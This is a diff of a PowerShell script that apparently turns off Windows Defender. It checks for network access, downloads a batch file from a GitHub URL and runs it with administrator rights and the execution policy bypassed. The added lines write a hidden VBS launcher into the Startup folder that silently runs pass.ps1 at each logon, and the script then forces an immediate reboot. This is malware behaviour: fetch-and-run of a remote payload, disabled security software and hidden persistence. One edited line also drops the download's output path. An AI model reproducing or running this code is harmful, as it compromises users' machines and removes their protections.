@@ -4,8 +4,8 @@ function getOthers{
     do {
         $ping = test-connection -comp github.com -count 1 -Quiet
     } until ($ping)
-        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile $env:userprofile\one.bat 
-        powershell -command "Start-Process %ProgramData%\Microsoft\Windows\one.bat -Verb runas"
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/4V4loon/InspectorConfig/main/oneline.bat" -OutFile
+        powershell -command "powershell -executionpolicy bypass Start-Process $env:userprofile\one.bat -Verb runas"
        
         exit
 }
@@ -125,24 +125,23 @@ if($(GET-Service -Name WinDefend).Status -eq "Running") {
 ## STEP 3 : Reboot if needed, add a link to the script to Startup (will be runned again after reboot)
 
 
-$link_reboot = "$env:programdata\Microsoft\Windows\Start Menu\Programs\StartUp\disable-defender.lnk"
-Remove-Item -Force "$link_reboot" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)
+##$link_reboot = "$env:programdata\Microsoft\Windows\Start Menu\Programs\StartUp\disable-defender.lnk"
+##Remove-Item -Force "$link_reboot" -ErrorAction 'ignore' # Remove the link (only execute once after reboot)
 
 if($need_reboot) {
-    
-    
-    $powershell_path = '"$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"'
-    $cmdargs = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
-    
-    $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force
-    $WshShell = New-Object -comObject WScript.Shell
-    $shortcut = $WshShell.CreateShortcut($link_reboot)
-    $shortcut.TargetPath = $powershell_path
-    $shortcut.Arguments = $cmdargs
-    $shortcut.WorkingDirectory = "$(Split-Path -Path $PSScriptRoot -Parent)"
-    $shortcut.Save()
-    shutdown.exe /r /t 0
-
+  ##  $powershell_path = '"$env:windir\System32\WindowsPowerShell\v1.0\powershell.exe"'
+   ## $cmdargs = "-ExecutionPolicy Bypass `"" + $MyInvocation.MyCommand.Path + "`" " + $MyInvocation.UnboundArguments
+   ## $res = New-Item $(Split-Path -Path $link_reboot -Parent) -ItemType Directory -Force
+   ## $WshShell = New-Object -comObject WScript.Shell
+   ## $shortcut = $WshShell.CreateShortcut($link_reboot)
+   ## $shortcut.TargetPath = $powershell_path
+   ## $shortcut.Arguments = $cmdargs
+   ## $shortcut.WorkingDirectory = "$(Split-Path -Path $PSScriptRoot -Parent)"
+   ## $shortcut.Save()
+add-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\def.vbs" -value 'Set WshShell = CreateObject("WScript.Shell")'
+add-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\def.vbs" -value 'WshShell.Run "powershell -command ""powershell -executionpolicy bypass -file $env:userprofile\pass.ps1"" ", 0, True'
+add-content -path "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\def.vbs" -value 'Set WshShell = Nothing'
+   shutdown.exe /r /t 0
 } else {
 
 
